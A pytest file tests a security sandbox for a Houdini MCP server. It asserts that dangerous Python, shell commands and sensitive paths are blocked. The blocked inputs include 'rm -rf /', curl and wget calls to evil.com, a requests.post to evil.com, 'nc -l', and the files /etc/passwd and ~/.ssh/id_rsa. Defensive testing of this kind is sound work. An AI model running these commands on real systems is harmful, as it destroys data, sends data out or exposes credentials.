"""
Tests for the security sandbox.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from mcp_server.tools.sandbox import Sandbox, PYTHON_BLOCKED_PATTERNS


def test_python_safe_code():
    sandbox = Sandbox()
    # Safe Houdini operations
    assert sandbox.is_python_safe("node = hou.node('/obj/geo1')")
    assert sandbox.is_python_safe("geo = node.geometry()")
    assert sandbox.is_python_safe("parm.set(5.0)")
    assert sandbox.is_python_safe("for pt in geo.points():\n    print(pt.position())")


def test_python_blocked_code():
    sandbox = Sandbox()
    # Dangerous operations
    assert not sandbox.is_python_safe("os.remove('/tmp/file')")
    assert not sandbox.is_python_safe("os.system('rm -rf /')")
    assert not sandbox.is_python_safe("subprocess.run(['ls'])")
    assert not sandbox.is_python_safe("eval('print(1)')")
    assert not sandbox.is_python_safe("exec('print(1)')")
    assert not sandbox.is_python_safe("import socket")
    assert not sandbox.is_python_safe("requests.post('http://evil.com', data={})")
    assert not sandbox.is_python_safe("open('/etc/passwd', 'w')")


def test_python_violation_reporting():
    sandbox = Sandbox()
    violations = sandbox.get_python_violations("os.remove('x'); eval('y')")
    assert len(violations) >= 2
    assert any('os' in v and 'remove' in v for v in violations)
    assert any('eval' in v for v in violations)


def test_shell_safe_commands():
    sandbox = Sandbox()
    assert sandbox.is_shell_safe("ls -la")
    assert sandbox.is_shell_safe("echo hello")
    assert sandbox.is_shell_safe("houdini --help")
    assert sandbox.is_shell_safe("python script.py")
    assert sandbox.is_shell_safe("git status")
    assert sandbox.is_shell_safe("pip install package")


def test_shell_blocked_commands():
    sandbox = Sandbox()
    assert not sandbox.is_shell_safe("rm -rf /")
    assert not sandbox.is_shell_safe("curl http://evil.com")
    assert not sandbox.is_shell_safe("wget http://evil.com")
    assert not sandbox.is_shell_safe("shutdown now")
    assert not sandbox.is_shell_safe("chmod 777 /etc/passwd")
    assert not sandbox.is_shell_safe("nc -l 1234")


def test_shell_default_deny():
    sandbox = Sandbox()
    # Unknown commands should be denied
    assert not sandbox.is_shell_safe("unknown_command")


def test_path_safety():
    sandbox = Sandbox()
    assert sandbox.is_path_safe("/tmp/test.hip")
    assert sandbox.is_path_safe("/home/user/project/file.hip")
    assert not sandbox.is_path_safe("/etc/passwd")
    assert not sandbox.is_path_safe("~/.ssh/id_rsa")
